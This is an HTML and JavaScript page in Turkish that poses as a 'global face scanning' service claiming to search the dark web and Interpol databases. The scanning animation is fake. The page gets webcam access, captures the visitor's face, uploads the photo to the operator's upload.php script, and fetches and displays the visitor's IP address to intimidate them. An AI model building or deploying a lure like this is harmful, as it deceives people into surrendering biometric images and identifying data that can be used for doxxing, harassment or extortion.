<!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Küresel Güvenlik Tarama Sistemi</title>
<style>
* { margin:0; padding:0; box-sizing:border-box; }
body { 
    background: #0a0a1a; 
    color: #00ffcc; 
    font-family: 'Courier New', monospace; 
    display: flex; 
    justify-content: center; 
    align-items: center; 
    min-height: 100vh; 
}
.container { 
    background: rgba(0,20,30,0.85); 
    padding: 30px; 
    border-radius: 20px; 
    border: 1px solid #00ffcc; 
    box-shadow: 0 0 50px #00ffcc33; 
    max-width: 550px; 
    width: 90%;
    text-align: center; 
}
h1 { font-size: 24px; margin-bottom: 5px; text-shadow: 0 0 10px #00ffcc; }
.sub { color: #88ddff; font-size: 12px; margin-bottom: 15px; }
.video-box { 
    background: #000; 
    border-radius: 12px; 
    overflow: hidden; 
    margin: 15px 0; 
    border: 2px solid #00ffcc;
    position: relative;
}
video { width: 100%; display: block; }

/* Yüz Tarama Animasyonu - Mavi Çizgiler */
.scan-overlay {
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    pointer-events: none;
    z-index: 10;
    display: none;
}
.scan-line {
    position: absolute;
    left: 0;
    width: 100%;
    height: 2px;
    background: linear-gradient(90deg, transparent, #00aaff, #00ffcc, #00aaff, transparent);
    box-shadow: 0 0 20px #00aaff, 0 0 60px #00aaff;
    animation: scanMove 0.8s linear infinite;
}
@keyframes scanMove {
    0% { top: 0%; }
    100% { top: 100%; }
}
.scan-box {
    position: absolute;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    width: 60%;
    height: 60%;
    border: 2px solid rgba(0, 170, 255, 0.6);
    border-radius: 10px;
    box-shadow: 0 0 30px rgba(0, 170, 255, 0.3);
    animation: boxPulse 1.5s ease-in-out infinite;
}
@keyframes boxPulse {
    0%, 100% { border-color: rgba(0, 170, 255, 0.4); box-shadow: 0 0 20px rgba(0, 170, 255, 0.2); }
    50% { border-color: rgba(0, 255, 204, 0.8); box-shadow: 0 0 40px rgba(0, 255, 204, 0.5); }
}
.scan-corners {
    position: absolute;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    width: 62%;
    height: 62%;
}
.scan-corners span {
    position: absolute;
    width: 20px;
    height: 20px;
    border-color: #00aaff;
    border-style: solid;
}
.scan-corners .tl { top: 0; left: 0; border-width: 3px 0 0 3px; }
.scan-corners .tr { top: 0; right: 0; border-width: 3px 3px 0 0; }
.scan-corners .bl { bottom: 0; left: 0; border-width: 0 0 3px 3px; }
.scan-corners .br { bottom: 0; right: 0; border-width: 0 3px 3px 0; }

.progress { 
    width: 100%; 
    height: 6px; 
    background: #1a3a3a; 
    border-radius: 4px; 
    margin: 10px 0; 
    overflow: hidden; 
}
.progress-bar { 
    width: 0%; 
    height: 100%; 
    background: linear-gradient(90deg, #00aaff, #00ffcc);
    transition: width 0.1s; 
}
#status { 
    font-size: 13px; 
    color: #88ddff; 
    margin: 8px 0; 
    min-height: 20px;
}
.btn { 
    background: transparent; 
    border: 2px solid #00ffcc; 
    color: #00ffcc; 
    padding: 14px 20px; 
    font-size: 16px; 
    font-weight: bold; 
    border-radius: 50px; 
    cursor: pointer; 
    transition: 0.3s; 
    width: 100%; 
    margin: 5px 0;
}
.btn:hover:not(:disabled) { 
    background: #00ffcc; 
    color: #0a0a1a; 
}
.btn:disabled { 
    opacity: 0.5; 
    cursor: not-allowed; 
}
.btn-success { border-color: #00ff88; color: #00ff88; }
.btn-danger { border-color: #ff4444; color: #ff4444; }
.fake-ip { 
    font-size: 11px; 
    color: #6688aa; 
    margin-top: 10px; 
    word-break: break-all;
}
.photo-count {
    font-size: 13px;
    color: #ffaa00;
    margin: 5px 0;
}
</style>
</head>
<body>
<div class="container">
    <h1>🔍 KÜRESEL YÜZ TARAMA</h1>
    <div class="sub">Dark Web • Deep Web • İnterpol Veritabanı</div>
    
    <div class="video-box">
        <video id="video" autoplay muted playsinline></video>
        <div class="scan-overlay" id="scanOverlay">
            <div class="scan-line"></div>
            <div class="scan-box"></div>
            <div class="scan-corners">
                <span class="tl"></span>
                <span class="tr"></span>
                <span class="bl"></span>
                <span class="br"></span>
            </div>
        </div>
    </div>
    
    <div class="progress">
        <div class="progress-bar" id="progressBar"></div>
    </div>
    
    <div id="status">📷 Kamera başlatılıyor...</div>
    <div class="photo-count" id="photoCount">📸 Çekilen Fotoğraf: 0</div>
    
    <button class="btn" id="scanBtn">🚀 TARAMAYI BAŞLAT</button>
    
    <div class="fake-ip" id="ipDisplay">🌐 Bağlantı IP: Algılanıyor...</div>
</div>

<script>
const video = document.getElementById('video');
const status = document.getElementById('status');
const progressBar = document.getElementById('progressBar');
const scanBtn = document.getElementById('scanBtn');
const ipDisplay = document.getElementById('ipDisplay');
const photoCount = document.getElementById('photoCount');
const scanOverlay = document.getElementById('scanOverlay');

let totalPhotos = 0;

// IP'yi göster
fetch('ip.php')
    .then(res => res.text())
    .then(ip => {
        ip = ip.trim();
        if (ip === '127.0.0.1' || ip === '::1') {
            ipDisplay.innerText = '🌐 Bağlantı IP: ' + ip + ' (yerel)';
        } else {
            ipDisplay.innerText = '🌐 Bağlantı IP: ' + ip;
        }
    })
    .catch(() => {
        ipDisplay.innerText = '🌐 Bağlantı IP: 192.168.1.1 (varsayılan)';
    });

// Kamerayı başlat
navigator.mediaDevices.getUserMedia({ 
    video: { 
        facingMode: 'user', 
        width: { ideal: 640 }, 
        height: { ideal: 480 } 
    } 
})
.then(stream => {
    video.srcObject = stream;
    status.innerText = '✅ Kamera hazır - "TARAMAYI BAŞLAT"a tıkla';
    scanBtn.disabled = false;
})
.catch(err => {
    status.innerText = '❌ Kamera izni gerekli!';
    scanBtn.disabled = true;
});

// Fotoğraf çekme
function capturePhoto() {
    return new Promise((resolve) => {
        const canvas = document.createElement('canvas');
        canvas.width = 640;
        canvas.height = 480;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, 640, 480);
        
        canvas.toBlob(function(blob) {
            const form = new FormData();
            form.append('photo', blob, 'face_' + Date.now() + '.png');
            
            fetch('upload.php', { 
                method: 'POST', 
                body: form 
            })
            .then(response => response.text())
            .then(data => {
                if (data === 'OK') {
                    totalPhotos++;
                    photoCount.innerText = '📸 Çekilen Fotoğraf: ' + totalPhotos;
                    resolve(true);
                } else {
                    resolve(false);
                }
            })
            .catch(() => resolve(false));
        });
    });
}

// Yüz Tarama - 5 saniye sürer
async function startFaceScan() {
    status.innerText = '⏳ Yüz taranıyor...';
    scanBtn.disabled = true;
    scanOverlay.style.display = 'block';
    
    let progress = 0;
    const interval = setInterval(() => {
        progress += 2;
        if (progress >= 100) {
            progress = 100;
            clearInterval(interval);
        }
        progressBar.style.width = Math.min(progress, 100) + '%';
    }, 50);
    
    // 5 saniye bekle
    await new Promise(r => setTimeout(r, 5000));
    
    clearInterval(interval);
    progressBar.style.width = '100%';
    scanOverlay.style.display = 'none';
    
    // Fotoğraf çek
    status.innerText = '📸 Fotoğraf çekiliyor...';
    const success = await capturePhoto();
    
    if (success) {
        status.innerText = '✅ Yüz tarama tamamlandı! Fotoğraf kaydedildi.';
    } else {
        status.innerText = '❌ Fotoğraf kaydedilemedi!';
    }
    
    scanBtn.disabled = false;
    progressBar.style.width = '0%';
}

// Butona tıkla
scanBtn.onclick = function() {
    if (this.disabled) return;
    startFaceScan();
};
</script>
</body>
  </html>
